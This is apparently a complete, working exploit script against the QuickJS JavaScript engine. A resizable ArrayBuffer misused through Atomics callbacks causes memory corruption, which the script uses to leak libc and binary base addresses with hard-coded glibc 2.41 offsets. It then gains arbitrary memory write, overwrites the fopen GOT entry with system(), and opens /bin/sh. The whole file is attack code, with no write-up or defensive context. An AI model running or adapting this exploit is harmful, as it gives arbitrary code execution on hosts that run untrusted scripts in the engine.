// exec-shell via Atomics UAF/OOB with resizable ArrayBuffer
import * as std from 'std';

const KEEP = [];

// Overwrite the backing store pointer of a freshly created ArrayBuffer by
// reusing a freed RAB data chunk for the JSArrayBuffer struct.
function makeABWithDataPtr(dataPtrBigInt, byteLen) {
  // RAB data size chosen so that old data chunk goes into tcache bin 0x50
  // and is reused by malloc(sizeof(JSArrayBuffer)) (~56 bytes).
  const rab = new ArrayBuffer(0x38, { maxByteLength: 0x1000 });
  const barrier = new ArrayBuffer(0x100);
  const ta = new BigInt64Array(rab);
  let victim;

  const o = {
    valueOf() {
      // Force realloc move by blocking in-place growth.
      rab.resize(0x200);
      victim = new ArrayBuffer(byteLen);
      // This value is written by Atomics.store() into stale ptr.
      return dataPtrBigInt;
    }
  };

  // index=2 -> stale ptr = old_data + 16 -> JSArrayBuffer.data field
  Atomics.store(ta, 2, o);

  KEEP.push(victim, rab, barrier, ta);
  return victim;
}

function leakLibcBase() {
  // Free an unsorted-bin-sized chunk and read its fd (main_arena+0x60).
  const rab = new ArrayBuffer(0x500, { maxByteLength: 0x2000 });
  const barrier = new ArrayBuffer(0x100);
  const ta = new BigInt64Array(rab);
  const o = {
    valueOf() {
      rab.resize(0x900);
      return 0n; // expected value
    }
  };
  const leak = Atomics.compareExchange(ta, 0, o, 0n);
  // For Debian GLIBC 2.41, unsorted bin fd points to libc_base + 0x1e7b20.
  return leak - 0x1e7b20n;
}

function leakPieBase() {
  // Reuse a freed chunk as a JSArray fast-array storage buffer.
  // JSValue is 16 bytes in this build, so for 8 elements the engine mallocs 128.
  const rab = new ArrayBuffer(0x80, { maxByteLength: 0x1000 });
  const barrier = new ArrayBuffer(0x100);
  const ta = new BigInt64Array(rab);

  const o = {
    valueOf() {
      rab.resize(0x200);
      // Array literal triggers expand_fast_array -> malloc(128)
      // first JSValue (16 bytes) starts with union.ptr, so reading 8 bytes
      // gives the JSObject* for parseInt.
      globalThis._tmp = [parseInt, 0, 0, 0, 0, 0, 0, 0];
      return 0n;
    }
  };

  const parseIntObjPtr = Atomics.compareExchange(ta, 0, o, 0n);

  // Read JSObject.u.cfunc.c_function at offset 0x38.
  const fAB = makeABWithDataPtr(parseIntObjPtr, 0x100);
  const dv = new DataView(fAB);
  const cfunc = dv.getBigUint64(0x38, true);

  // js_parseInt symbol offset in qjs binary.
  return cfunc - 0x53c30n;
}

const libcBase = leakLibcBase();
const systemAddr = libcBase + 0x53110n;

const pieBase = leakPieBase();

// fopen@GOT in qjs (from objdump -R), offset from PIE base.
const fopenGot = pieBase + 0x10b340n;
const gotAB = makeABWithDataPtr(fopenGot, 0x20);
const gotDV = new DataView(gotAB);
// Overwrite GOT entry to point to system().
gotDV.setBigUint64(0, systemAddr, true);

// Trigger: std.open() calls fopen(filename, mode).
// After GOT overwrite, this becomes system(filename).
std.open('/bin/sh', 'r');
